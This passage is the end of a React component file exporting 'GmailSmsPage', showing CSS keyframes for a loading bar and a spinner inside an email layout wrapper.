          {/* Keyframes para a barra */}
          <style>{`
          @keyframes loadingBar {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0%); }
            100% { transform: translateX(100%); }
          }
          @keyframes spin { from { transform: rotate(0deg);} to { transform: rotate(360deg);} }
        `}</style>
        </div>
      </div>
    </EmailLayout>
  );
};

export default GmailSmsPage;
